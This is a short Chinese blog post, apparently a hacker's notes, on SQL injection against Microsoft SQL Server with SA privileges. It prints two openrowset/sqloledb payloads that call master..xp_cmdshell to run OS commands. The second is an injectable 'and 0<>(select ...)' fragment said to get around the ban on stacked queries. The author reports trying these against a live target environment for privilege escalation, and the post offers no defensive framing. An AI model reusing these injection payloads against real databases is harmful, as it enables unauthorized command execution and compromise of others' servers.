
SQL注入不能多句执行时的一种突破方法（SA权限）

有时候会遇到SA权限不能多句执行的情况，让人很蛋疼。

前几天在搞一个SQL SERVER 7.0的PUBLIC权限时。

某牛给我以下语句提权

select * from openrowset('sqloledb','dsn=locaserver;trusted_connection=yes','set fmtonly off exec master..xp_cmdshell ''dir c:''')

本机测试成功。

但实际环境中却出现[微软] [ODBC SQL Server驱动] [SQL Server中] OLE DB提供程序'sqloledb'无法创建一个接口 的错误。原因不明，

虽然这个问题偶还没有解决，但今天遇到一个SA权限不能多句的情况（估计驱动问题，不解），让我蛋疼了一段时间。

后来经过GOOGLE，发现SA权限还可以这样执行。

and 0<>(select * from openrowset('sqloledb','dsn=locaserver;trusted_connection=yes','set fmtonly off exec master..xp_cmdshell ''dir c:'''))

这样就绕过了多句执行的限制了。

